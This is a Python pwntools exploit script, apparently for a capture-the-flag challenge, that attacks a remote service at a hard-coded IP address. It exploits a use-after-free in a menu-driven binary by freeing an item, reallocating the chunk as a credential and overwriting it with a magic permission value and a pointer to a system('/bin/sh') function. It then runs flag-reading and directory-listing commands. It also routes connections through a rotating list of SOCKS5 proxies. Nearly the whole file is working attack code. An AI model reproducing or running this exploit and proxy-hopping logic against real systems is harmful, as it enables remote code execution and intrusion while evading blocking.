import os
import re
import socket
import struct
import sys
from pwn import *
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = args.LOG or 'info'
context.arch = 'amd64'
context.binary = elf = ELF(os.path.join(HERE, 'pwn', 'uaf'), checksec=False)

HOST = args.HOST or '103.163.47.230'
PORT = int(args.PORT or 35125)

WIN = 0x401246            # 函数体就是 system("/bin/sh")
PERM = 0x1337C0DE         # 凭证权限魔数（题面里写着"高级权限编号"）

PAYLOAD = flat(
    b'A' * 16,            # +0x00 随便
    p32(PERM),            # +0x10 权限
    p32(1),               # +0x14 已激活
    p64(WIN),             # +0x18 函数指针
)
HEXSTR = PAYLOAD.hex().encode()   # 编辑接口要 64 个 hex 字符

CMDS = [
    b'cat /flag*; cat flag*; cat /flag; echo ---; ls -la /; ls -la .',
]

SOCKS_FILE = os.path.join(HERE, '_socks_ok.txt')
MENU = '请选择：'.encode()


def socks5_connect(proxy, target, timeout=10):
    """裸 socket 做 SOCKS5 握手（无认证 / IPv4 直连），返回已连通的 socket。"""
    host, port = proxy
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(b'\x05\x01\x00')
        if s.recv(2) != b'\x05\x00':
            raise RuntimeError('socks method reject')
        s.sendall(b'\x05\x01\x00\x01' + socket.inet_aton(target[0]) + struct.pack('>H', target[1]))
        r = s.recv(10)
        if len(r) < 2 or r[1] != 0:
            raise RuntimeError('socks connect rc=%s' % (r[1] if len(r) > 1 else '?'))
        return s
    except Exception:
        s.close()
        raise


def load_socks():
    if not os.path.exists(SOCKS_FILE):
        return []
    out = []
    with open(SOCKS_FILE) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            h, _, p = line.rpartition(':')
            if h:
                out.append((h, int(p)))
    return out


def connect():
    """返回 pwntools tube。先直连（DIRECT），否则按代理列表挨个试，用 banner 验活。"""
    if args.DIRECT:
        log.info('直连 %s:%d', HOST, PORT)
        return remote(HOST, PORT, timeout=10)

    proxies = load_socks()
    if not proxies:
        log.warning('没有可用代理列表，直连试试')
        return remote(HOST, PORT, timeout=10)

    for hp in proxies:
        try:
            s = socks5_connect(hp, (HOST, PORT))
            io = remote.fromsocket(s)
            io.timeout = 10
            head = io.recv(256, timeout=6)
            if b'======' not in head:
                log.debug('%s:%s banner 不对，换下一个', hp[0], hp[1])
                io.close()
                continue
            log.success('via %s:%s', hp[0], hp[1])
            io.unrecv(head)
            return io
        except Exception as e:
            log.debug('%s:%s -> %s', hp[0], hp[1], str(e)[:60])
    raise SystemExit('所有代理都连不上，换 IP / 检查网络')


def exploit(io):
    io.recvuntil(MENU)                               # 主菜单
    io.sendline(b'1')                                # 登记 -> malloc(0x20)
    io.sendlineafter('请简单描述这件失物：'.encode(), b'LOST')

    io.recvuntil(MENU)
    io.sendline(b'2')                                # 删除 -> free，索引悬空

    io.recvuntil(MENU)
    io.sendline(b'4')                                # 申请凭证 -> malloc 复用同一块

    io.recvuntil(MENU)
    io.sendline(b'3')                                # 编辑（走悬空索引）
    io.recvuntil('：'.encode())
    io.sendline(HEXSTR)                              # 覆写凭证

    io.recvuntil(MENU)
    io.sendline(b'5')                                # 使用凭证 -> 校验通过 -> shell

    out = b''
    for c in CMDS:
        io.sendline(c)
        out += io.recvrepeat(1.2)
    return out


def main():
    io = connect()
    try:
        out = exploit(io)
    except EOFError:
        log.failure('连接被关闭（代理 RST 或程序崩了），换个代理重跑')
        return 1

    text = out.decode('utf-8', 'replace')
    if text:
        print(text, end='' if text.endswith('\n') else '\n')

    m = re.search(rb'HTUCTF\{[^}]*\}', out)
    if m:
        log.success('FLAG = %s', m.group().decode())
        dst = os.path.join(HERE, 'flag.txt')
        if os.path.exists(dst):
            open(dst + '.old', 'wb').write(open(dst, 'rb').read())   # 老内容留档
        open(dst, 'wb').write(m.group())
    elif args.i:
        io.interactive()
    else:
        log.warning('没抓到 flag，加 -i 手动看')
    io.close()
    return 0


if __name__ == '__main__':
    sys.exit(main())
